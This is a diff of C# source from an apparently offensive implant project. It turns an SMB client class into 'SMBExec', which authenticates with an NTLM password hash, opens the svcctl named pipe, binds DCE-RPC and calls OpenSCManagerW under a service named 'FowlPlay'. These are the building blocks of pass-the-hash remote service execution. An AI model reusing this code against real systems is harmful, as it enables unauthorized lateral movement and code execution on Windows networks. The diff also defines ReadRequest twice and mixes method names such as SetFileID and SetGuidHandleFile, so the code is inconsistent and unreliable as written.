@@ -5,36 +5,53 @@ using System.Net.Sockets;
 using System.Security.Cryptography;
 using System.Text;
 
+
 namespace WheresMyImplant
 {
-    class SMBClient : SMB
+    class SMBExec : SMB
     {
         Byte[] flags;
         UInt32 messageId = 0x1;
         Byte[] treeId = { 0x00, 0x00, 0x00, 0x00 };
         Byte[] sessionId = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
-        
+
         Byte[] sessionKeyLength = { 0x00, 0x00 };
         Boolean signing = false;
         Byte[] sessionKey;
 
         String version;//= "SMB2";
+        String system;
 
         Byte[] processId;
+        TcpClient smbClient;
+        NetworkStream streamSocket;
 
         Byte[] guidFileHandle = new Byte[16];
 
         Byte[] recieve = new Byte[81920];
 
+        Byte[] serviceName;
+
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        public SMBClient()
+        internal SMBExec()
         {
             smbClient = new TcpClient();
             Int32 dwProcessId = Process.GetCurrentProcess().Id;
             String strProcessId = BitConverter.ToString(BitConverter.GetBytes(dwProcessId));
-            processId = strProcessId.Split('-').Select(i => (Byte)Convert.ToInt16(i,16)).ToArray();
+            processId = strProcessId.Split('-').Select(i => (Byte)Convert.ToInt16(i, 16)).ToArray();
+
+            serviceName = Encoding.ASCII.GetBytes("FowlPlay");
+
+            if (0 == serviceName.Length % 2)
+            {
+                serviceName = Misc.Combine(serviceName, new Byte[] { 0x00, 0x00 });
+            }
+            else
+            {
+                serviceName = Misc.Combine(serviceName, new Byte[] { 0x00, 0x00, 0x00, 0x00 });
+            }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -93,7 +110,7 @@ namespace WheresMyImplant
         //
         ////////////////////////////////////////////////////////////////////////////////
         public void NegotiateSMB2()
-        {   
+        {
             SMB2Header header = new SMB2Header();
             header.SetCommand(new Byte[] { 0x00, 0x00 });
             header.SetCreditsRequested(new Byte[] { 0x00, 0x00 });
@@ -135,7 +152,7 @@ namespace WheresMyImplant
             SMB2NTLMSSPNegotiate NTLMSSPNegotiate = new SMB2NTLMSSPNegotiate(version);
             NTLMSSPNegotiate.SetFlags(flags);
             Byte[] bNegotiate = NTLMSSPNegotiate.GetSMB2NTLMSSPNegotiate();
-            
+
             SMB2SessionSetupRequest sessionSetup = new SMB2SessionSetupRequest();
             sessionSetup.SetSecurityBlob(bNegotiate);
             Byte[] bData = sessionSetup.GetSMB2SessionSetupRequest();
@@ -174,7 +191,7 @@ namespace WheresMyImplant
             Byte[] bHash = new Byte[hash.Length / 2];
             for (Int32 i = 0; i < hash.Length; i += 2)
             {
-                bHash[j++] = (Byte)((Char)Convert.ToInt16(hash.Substring(i, 2),16));
+                bHash[j++] = (Byte)((Char)Convert.ToInt16(hash.Substring(i, 2), 16));
             }
 
             Byte[] bHostname = Encoding.Unicode.GetBytes(Environment.MachineName);
@@ -297,10 +314,16 @@ namespace WheresMyImplant
             streamSocket.Flush();
             streamSocket.Read(recieve, 0, recieve.Length);
 
-            if (GetStatus(recieve.Skip(12).Take(4).ToArray()))
+            Byte[] status = recieve.Skip(12).Take(4).ToArray();
+            if (status.SequenceEqual(new Byte[] { 0x00, 0x00, 0x00, 0x00 }))
+            {
+                WriteOutputGood(String.Format("{0} Login Successful to {1}", username, system));
                 return true;
-            else
-                return false;
+            }
+            
+            WriteOutput(String.Format("[-] {0} Login Failed to {1}", username, system));
+            WriteOutput(String.Format("[-] Status: {0}", BitConverter.ToString(status)));
+            return false;
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -319,7 +342,7 @@ namespace WheresMyImplant
             SMB2TreeConnectRequest treeConnect = new SMB2TreeConnectRequest();
             treeConnect.SetPath(share);
             Byte[] bData = treeConnect.GetRequest();
-    
+
             if (signing)
             {
                 header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
@@ -343,47 +366,6 @@ namespace WheresMyImplant
                 return false;
         }
 
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
-        internal void IoctlRequest(String share)
-        {
-            treeId = new Byte[] { 0x01, 0x00, 0x00, 0x00 };
-
-            SMB2Header header = new SMB2Header();
-            header.SetCommand(new Byte[] { 0x0b, 0x00 });
-            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
-            header.SetMessageID(++messageId);
-            header.SetProcessID(processId);
-            header.SetTreeId(treeId);
-            header.SetSessionID(sessionId);
-
-            SMB2IoctlRequest ioctlRequest = new SMB2IoctlRequest();
-            ioctlRequest.SetFileName(share);
-            Byte[] bData = ioctlRequest.GetRequest();
-
-            if (signing)
-            {
-                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
-                header.SetSignature(sessionKey, ref bData);
-            }
-            Byte[] bHeader = header.GetHeader();
-
-            NetBIOSSessionService sessionService = new NetBIOSSessionService();
-            sessionService.SetHeaderLength(bHeader.Length);
-            sessionService.SetDataLength(bData.Length);
-            Byte[] bSessionService = sessionService.GetNetBIOSSessionService();
-
-            Byte[] bSend = Misc.Combine(Misc.Combine(bSessionService, bHeader), bData);
-            streamSocket.Write(bSend, 0, bSend.Length);
-            streamSocket.Flush();
-            streamSocket.Read(recieve, 0, recieve.Length);
-            treeId = new Byte[] { 0x00, 0x00, 0x00, 0x00 };
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
         internal Boolean CreateRequest()
         {
             treeId = recieve.Skip(40).Take(4).ToArray();
@@ -397,7 +379,8 @@ namespace WheresMyImplant
             header.SetSessionID(sessionId);
 
             SMB2CreateRequest createRequest = new SMB2CreateRequest();
-            createRequest.SetExtraInfo(1, 0);
+            createRequest.SetFileName("svcctl");
+            createRequest.SetShareAccess(new Byte[] { 0x07, 0x00, 0x00, 0x00 });
             Byte[] bData = createRequest.GetRequest();
 
             if (signing)
@@ -417,9 +400,8 @@ namespace WheresMyImplant
             streamSocket.Flush();
             streamSocket.Read(recieve, 0, recieve.Length);
 
-            Boolean result = GetStatus(recieve.Skip(12).Take(4).ToArray());
-            if (result)
-            { 
+            if (GetStatus(recieve.Skip(12).Take(4).ToArray()))
+            {
                 guidFileHandle = recieve.Skip(0x0084).Take(16).ToArray();
                 return true;
             }
@@ -429,25 +411,28 @@ namespace WheresMyImplant
             }
         }
 
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
-        internal Boolean InfoRequest()
+        internal Boolean RPCBind()
         {
             SMB2Header header = new SMB2Header();
-            header.SetCommand(new Byte[] { 0x10, 0x00 });
+            header.SetCommand(new Byte[] { 0x09, 0x00 });
             header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
             header.SetMessageID(++messageId);
             header.SetProcessID(processId);
             header.SetTreeId(treeId);
             header.SetSessionID(sessionId);
 
-            SMB2GetInfo getInfo = new SMB2GetInfo();
-            getInfo.SetClass(new Byte[] { 0x02 });
-            getInfo.SetInfoLevel(new Byte[] { 0x05 });
-            getInfo.SetMaxResponseSize(new Byte[] { 0x50, 0x00, 0x00, 0x00 });
-            getInfo.SetGUIDHandleFile(recieve.Skip(132).Take(16).ToArray());
-            Byte[] bData = getInfo.GetRequest();
+            DCERPCBind bind = new DCERPCBind();
+            bind.SetFragLength(new Byte[] { 0x48, 0x00 });
+            bind.SetCallID(1);
+            bind.SetNumCtxItems(new Byte[] { 0x01 });
+            bind.SetInterface(new Byte[] { 0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35, 0xad, 0x32, 0x98, 0xf0, 0x38, 0x00, 0x10, 0x03 });
+            bind.SetInterfaceVer(new Byte[] { 0x02, 0x00 });
+            Byte[] bData = bind.GetRequest();
+
+            SMB2WriteRequest writeRequest = new SMB2WriteRequest();
+            writeRequest.SetFileID(guidFileHandle);
+            writeRequest.SetLength(bData.Length);
+            bData = Misc.Combine(writeRequest.GetRequest(), bData);
 
             if (signing)
             {
@@ -472,179 +457,24 @@ namespace WheresMyImplant
                 return false;
         }
 
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
-        internal Boolean FindRequest()
+        internal Boolean ReadRequest()
         {
-            treeId = recieve.Skip(40).Take(4).ToArray();
-
-            ////////////////////////////////////////////////////////////////////////////////
             SMB2Header header = new SMB2Header();
-            header.SetCommand(new Byte[] { 0x05, 0x00 });
+            header.SetCommand(new Byte[] { 0x08, 0x00 });
             header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
             header.SetMessageID(++messageId);
             header.SetProcessID(processId);
             header.SetTreeId(treeId);
             header.SetSessionID(sessionId);
 
-            SMB2CreateRequest createRequest = new SMB2CreateRequest();
-            createRequest.SetExtraInfo(1, 0);
-            createRequest.SetAccessMask(new Byte[] { 0x81, 0x00, 0x10, 0x00 });
-            createRequest.SetShareAccess(new Byte[] { 0x07, 0x00, 0x00, 0x00 });
-            Byte[] bData = createRequest.GetRequest();
-
-            header.SetChainOffset(bData.Length);
-            if (signing)
-            {
-                header.SetFlags(new Byte[] { 0x0c, 0x00, 0x00, 0x00 });
-                header.SetSignature(sessionKey, ref bData);
-            }
-            else
-            {
-                header.SetFlags(new Byte[] { 0x00, 0x00, 0x00, 0x00 });
-            }
-            Byte[] bHeader = header.GetHeader();
-            
-
-            ////////////////////////////////////////////////////////////////////////////////
-            SMB2Header header2 = new SMB2Header();
-            header2.SetCommand(new Byte[] { 0x0e, 0x00 });
-            header2.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
-            header2.SetMessageID(++messageId);
-            header2.SetProcessID(processId);
-            header2.SetTreeId(treeId);
-            header2.SetSessionID(sessionId);
-            header2.SetChainOffset(new Byte[] { 0x68, 0x00, 0x00, 0x00 });
-
-            SMB2FindFileRequestFile requestFile = new SMB2FindFileRequestFile();
-            requestFile.SetPadding(new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
-            Byte[] bData2 = requestFile.GetRequest();
-
-            if (signing)
-            {
-                header2.SetFlags(new Byte[] { 0x0c, 0x00, 0x00, 0x00 });
-                header2.SetSignature(sessionKey, ref bData2);
-            }
-            else
-            {
-                header2.SetFlags(new Byte[] { 0x04, 0x00, 0x00, 0x00 });
-            }
-            Byte[] bHeader2 = header2.GetHeader();
-
-
-            ////////////////////////////////////////////////////////////////////////////////
-            SMB2Header header3 = new SMB2Header();
-            header3.SetCommand(new Byte[] { 0x0e, 0x00 });
-            header3.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
-            header3.SetMessageID(++messageId);
-            header3.SetProcessID(processId);
-            header3.SetTreeId(treeId);
-            header3.SetSessionID(sessionId);
-
-            SMB2FindFileRequestFile requestFile2 = new SMB2FindFileRequestFile();
-            requestFile2.SetOutputBufferLength(new Byte[] { 0x80, 0x00, 0x00, 0x00 });
-            Byte[] bData3 = requestFile2.GetRequest();
-
-            if (signing)
-            {
-                header3.SetFlags(new Byte[] { 0x0c, 0x00, 0x00, 0x00 });
-                header3.SetSignature(sessionKey, ref bData3);
-            }
-            else
-            {
-                header3.SetFlags(new Byte[] { 0x04, 0x00, 0x00, 0x00 });
-            }
-            Byte[] bHeader3 = header3.GetHeader();
-
-
-            ////////////////////////////////////////////////////////////////////////////////
-            NetBIOSSessionService sessionService = new NetBIOSSessionService();
-            sessionService.SetHeaderLength(bHeader.Length + bHeader2.Length + bHeader3.Length);
-            sessionService.SetDataLength(bData.Length + bData2.Length + bData3.Length);
-            Byte[] bSessionService = sessionService.GetNetBIOSSessionService();
-
-            Byte[] bSend = Misc.Combine(Misc.Combine(bSessionService, bHeader), bData);
-            bSend = Misc.Combine(bSend, Misc.Combine(bHeader2, bData2));
-            bSend = Misc.Combine(bSend, Misc.Combine(bHeader3, bData3));
-            streamSocket.Write(bSend, 0, bSend.Length);
-            streamSocket.Flush();
-            streamSocket.Read(recieve, 0, recieve.Length);
-
-            if (GetStatus(recieve.Skip(12).Take(4).ToArray()))
-                return true;
-            else
-                return false;
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
-        internal void ParseDirectoryContents()
-        {
-            String directory = BitConverter.ToString(recieve).Replace("-", "");
-            Int32 index = directory.Substring(10).IndexOf("FE534D42") + 154;
-            Int32 offset = 0;
-            Int32 nextOffset = 0;
-            WriteOutput("");
-            WriteOutput(String.Format("{0,5}{1,15}{2,20}{3,20}\t{4}", "Mode", "File Size", "Created", "Modified", "File Name"));
-            WriteOutput(String.Format("{0,5}{1,15}{2,20}{3,20}\t{4}", "----", "---------", "-------", "--------", "---------"));
-            do
-            {
-                Int32 start = (index / 2 + offset);
-                nextOffset = BitConverter.ToInt32(recieve.Skip(start).Take(4).ToArray(), 0);
-                UInt32 dwFileLength = BitConverter.ToUInt32(recieve.Skip(start + 40).Take(7).ToArray(), 0);
-                String fileLength = 0 == dwFileLength ? String.Empty : dwFileLength.ToString();
-
-                String attributes = Convert.ToString(recieve[start + 56], 2).PadLeft(16, '0');
-                String d = attributes.Substring(11, 1) == "1" ? "d" : "-";
-                String a = attributes.Substring(10, 1) == "1" ? "a" : "-";
-                String r = attributes.Substring(15, 1) == "1" ? "r" : "-";
-                String h = attributes.Substring(14, 1) == "1" ? "h" : "-";
-                String s = attributes.Substring(13, 1) == "1" ? "s" : "-";
-
-                DateTime create = DateTime.FromFileTime(BitConverter.ToInt64(recieve.Skip(start + 8).Take(8).ToArray(), 0));
-                DateTime modify = DateTime.FromFileTime(BitConverter.ToInt64(recieve.Skip(start + 24).Take(8).ToArray(), 0));
-                Int32 filenameLength = BitConverter.ToInt32(recieve.Skip(start + 60).Take(4).ToArray(), 0);
-                Byte[] filename_unicode = recieve.Skip(start + 104).Take(filenameLength).ToArray();
-                String filename = Encoding.Unicode.GetString(filename_unicode);
-                WriteOutput(String.Format(
-                    "{0,5}{1,15}{2,20}{3,20}\t{4}", 
-                    d + a + r + h + s,  
-                    fileLength, 
-                    create.ToString("MM/dd/yyyy HH:mm"), 
-                    modify.ToString("MM/dd/yyyy HH:mm"), 
-                    filename));
-                offset += nextOffset;
-            }
-            while (nextOffset != 0);
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
-        internal Boolean CloseRequest()
-        {
-            SMB2Header header = new SMB2Header();
-            header.SetCommand(new Byte[] { 0x06, 0x00 });
-            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
-            header.SetMessageID(++messageId);
-            header.SetProcessID(processId);
-            header.SetTreeId(treeId);
-            header.SetSessionID(sessionId);
-
-            SMB2CloseRequest closeRequest = new SMB2CloseRequest();
-            closeRequest.SetFileID(guidFileHandle);
-            Byte[] bData = closeRequest.GetRequest();
+            SMB2ReadRequest readRequest = new SMB2ReadRequest();
+            readRequest.SetGuidHandleFile(guidFileHandle);
+            Byte[] bData = readRequest.GetRequest();
 
             if (signing)
             {
                 header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
                 header.SetSignature(sessionKey, ref bData);
-            }
-            else
-            {
-                header.SetFlags(new Byte[] { 0x00, 0x00, 0x00, 0x00 });
             }
             Byte[] bHeader = header.GetHeader();
 
@@ -664,30 +494,39 @@ namespace WheresMyImplant
                 return false;
         }
 
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
-        internal Boolean DisconnectTree()
+        internal Boolean OpenSCManagerW()
         {
             SMB2Header header = new SMB2Header();
-            header.SetCommand(new Byte[] { 0x04, 0x00 });
+            header.SetCommand(new Byte[] { 0x09, 0x00 });
             header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
             header.SetMessageID(++messageId);
             header.SetProcessID(processId);
             header.SetTreeId(treeId);
             header.SetSessionID(sessionId);
 
-            SMB2TreeDisconnectRequest disconnectRequest = new SMB2TreeDisconnectRequest();
-            Byte[] bData = disconnectRequest.GetRequest();
+            SVCCTLSCMOpenSCManagerW openSCManagerW = new SVCCTLSCMOpenSCManagerW();
+            Byte[] bSCManager = openSCManagerW.GetRequest();
+
+            DCERPCRequest rpcRequest = new DCERPCRequest();
+            rpcRequest.SetPacketFlags(new Byte[] { 0x03 });
+            rpcRequest.SetFragLength(bSCManager.Length, 0, 0);
+            rpcRequest.SetCallID(new Byte[] { 0x01, 0x00, 0x00, 0x00 });
+            rpcRequest.SetContextID(new Byte[] { 0x00, 0x00 });
+            rpcRequest.SetOpnum(new Byte[] { 0x0f, 0x00 });
+            Byte[] bRPCRequest = rpcRequest.GetRequest();
+
+            SMB2WriteRequest writeRequest = new SMB2WriteRequest();
+            writeRequest.SetGuidHandleFile(guidFileHandle);
+            writeRequest.SetLength(bRPCRequest.Length + bSCManager.Length);
+            Byte[] bWriteRequest = writeRequest.GetRequest();
+
+            Byte[] bData = Misc.Combine(bWriteRequest, bRPCRequest);
+            bData = Misc.Combine(bData, bSCManager);
 
             if (signing)
             {
                 header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
                 header.SetSignature(sessionKey, ref bData);
-            }
-            else
-            {
-                header.SetFlags(new Byte[] { 0x00, 0x00, 0x00, 0x00 });
             }
             Byte[] bHeader = header.GetHeader();
 
@@ -707,9 +546,42 @@ namespace WheresMyImplant
                 return false;
         }
 
-        ~SMBClient()
+        internal Boolean ReadRequest()
         {
-            Dispose();
+            SMB2Header header = new SMB2Header();
+            header.SetCommand(new Byte[] { 0x08, 0x00 });
+            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
+            header.SetMessageID(++messageId);
+            header.SetProcessID(processId);
+            header.SetTreeId(treeId);
+            header.SetSessionID(sessionId);
+
+            SMB2ReadRequest readRequest = new SMB2ReadRequest();
+            readRequest.SetGuidHandleFile(guidFileHandle);
+            readRequest.SetLength(new Byte[] { 0xff, 0x00, 0x00, 0x00 });
+            Byte[] bData = readRequest.GetRequest();
+
+            if (signing)
+            {
+                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
+                header.SetSignature(sessionKey, ref bData);
+            }
+            Byte[] bHeader = header.GetHeader();
+
+            NetBIOSSessionService sessionService = new NetBIOSSessionService();
+            sessionService.SetHeaderLength(bHeader.Length);
+            sessionService.SetDataLength(bData.Length);
+            Byte[] bSessionService = sessionService.GetNetBIOSSessionService();
+
+            Byte[] bSend = Misc.Combine(Misc.Combine(bSessionService, bHeader), bData);
+            streamSocket.Write(bSend, 0, bSend.Length);
+            streamSocket.Flush();
+            streamSocket.Read(recieve, 0, recieve.Length);
+
+            if (GetStatus(recieve.Skip(12).Take(4).ToArray()))
+                return true;
+            else
+                return false;
         }
     }
 }
